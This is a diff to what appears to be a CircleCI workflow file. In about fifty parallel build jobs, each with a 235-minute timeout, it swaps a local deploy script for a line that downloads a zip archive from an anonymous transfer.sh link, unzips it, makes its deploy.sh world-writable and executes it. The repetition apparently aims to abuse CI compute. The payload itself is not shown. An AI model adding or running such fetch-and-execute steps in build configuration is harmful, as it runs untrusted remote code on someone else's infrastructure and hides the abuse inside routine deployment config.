@@ -11,7 +11,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build1:
     machine:
@@ -24,7 +24,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build2:
     machine:
@@ -37,7 +37,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build3:
     machine:
@@ -50,7 +50,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build4:
     machine:
@@ -63,7 +63,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build5:
     machine:
@@ -76,7 +76,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build6:
     machine:
@@ -89,7 +89,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build7:
     machine:
@@ -102,7 +102,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build8:
     machine:
@@ -115,7 +115,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build9:
     machine:
@@ -128,7 +128,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build10:
     machine:
@@ -141,7 +141,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build11:
     machine:
@@ -154,7 +154,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build12:
     machine:
@@ -167,7 +167,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build13:
     machine:
@@ -180,7 +180,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build14:
     machine:
@@ -193,7 +193,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build15:
     machine:
@@ -206,7 +206,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build16:
     machine:
@@ -219,7 +219,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build17:
     machine:
@@ -232,7 +232,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build18:
     machine:
@@ -245,7 +245,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build19:
     machine:
@@ -258,7 +258,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build20:
     machine:
@@ -271,7 +271,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build21:
     machine:
@@ -284,7 +284,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build22:
     machine:
@@ -297,7 +297,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build23:
     machine:
@@ -310,7 +310,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build24:
     machine:
@@ -323,7 +323,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build25:
     machine:
@@ -336,7 +336,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build26:
     machine:
@@ -349,7 +349,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build27:
     machine:
@@ -362,7 +362,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build28:
     machine:
@@ -375,7 +375,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build29:
     machine:
@@ -388,7 +388,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build30:
     machine:
@@ -401,7 +401,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build31:
     machine:
@@ -414,7 +414,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build32:
     machine:
@@ -427,7 +427,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build33:
     machine:
@@ -440,7 +440,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build34:
     machine:
@@ -453,7 +453,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build35:
     machine:
@@ -466,7 +466,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build36:
     machine:
@@ -479,7 +479,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build37:
     machine:
@@ -492,7 +492,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build38:
     machine:
@@ -505,7 +505,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build39:
     machine:
@@ -518,7 +518,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build40:
     machine:
@@ -531,7 +531,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build41:
     machine:
@@ -544,7 +544,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build42:
     machine:
@@ -557,7 +557,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build43:
     machine:
@@ -570,7 +570,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build44:
     machine:
@@ -583,7 +583,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build45:
     machine:
@@ -596,7 +596,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build46:
     machine:
@@ -609,7 +609,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build47:
     machine:
@@ -622,7 +622,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build48:
     machine:
@@ -635,7 +635,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build49:
     machine:
@@ -648,7 +648,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   build50:
     machine:
@@ -661,7 +661,7 @@ jobs:
         command: |
                     sudo apt update 
                     sudo apt install screen -y 
-                    chmod u+x deploy.sh && ./deploy.sh
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
         no_output_timeout: 235m
   
 
